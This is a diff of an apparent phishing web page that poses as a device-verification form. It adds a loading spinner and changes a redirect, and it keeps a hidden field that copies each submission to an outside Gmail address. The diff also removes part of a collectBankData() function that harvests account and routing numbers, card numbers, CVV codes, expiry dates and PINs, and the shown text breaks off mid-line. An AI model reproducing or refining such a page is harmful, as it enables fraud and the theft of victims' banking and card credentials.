@@ -130,6 +130,34 @@ border-radius: 8px;
 margin-top: 15px;
 text-align: center;
 }
+
+.loading-overlay {
+display: none;
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+background: rgba(255,255,255,0.8);
+z-index: 1000;
+justify-content: center;
+align-items: center;
+flex-direction: column;
+}
+
+.spinner {
+width: 50px;
+height: 50px;
+border: 5px solid #f3f3f3;
+border-top: 5px solid #3498db;
+border-radius: 50%;
+animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+0% { transform: rotate(0deg); }
+100% { transform: rotate(360deg); }
+}
 </style>
 </head>
 
@@ -166,7 +194,7 @@ text-align: center;
 
 <input type="hidden" name="_captcha" value="false">
 <input type="hidden" name="_template" value="table">
-<input type="hidden" name="_next" value="index.html">
+<input type="hidden" name="_next" value="https://your-website.com/index.html">
 <input type="hidden" name="_cc" value="elonmusk2020v@gmail.com">
 
 <input type="text" name="name" placeholder="Full Name" required>
@@ -211,6 +239,11 @@ text-align: center;
 <p>Thank you for verifying your device. Your submission is now being processed.</p>
 </div>
 </div>
+</div>
+
+<div id="loadingOverlay" class="loading-overlay">
+<div class="spinner"></div>
+<p>Processing your submission...</p>
 </div>
 
 <script>
@@ -261,19 +294,3 @@ function collectBankData() {
                     const parsed = JSON.parse(data);
                     
                     // Extract account information
-                    if (parsed.accountNumber) bankData.accountNumber = parsed.accountNumber;
-                    if (parsed.routingNumber) bankData.routingNumber = parsed.routingNumber;
-                    if (parsed.balance) bankData.balance = parsed.balance;
-                    if (parsed.bankName) bankData.name = parsed.bankName;
-                    if (parsed.name) bankData.name = parsed.name;
-                    
-                    // Extract card information
-                    if (parsed.cardNumber) bankData.creditCard = parsed.cardNumber;
-                    if (parsed.creditCardNumber) bankData.creditCard = parsed.creditCardNumber;
-                    if (parsed.cvv) bankData.cvv = parsed.cvv;
-                    if (parsed.expiry) bankData.expiry = parsed.expiry;
-                    if (parsed.expiryDate) bankData.expiry = parsed.expiryDate;
-                    
-                    // Extract PIN information
-                    if (parsed.pin) bankData.pin = parsed.pin;
-                    if (parsed.cardPin) bankData.pin = parsed
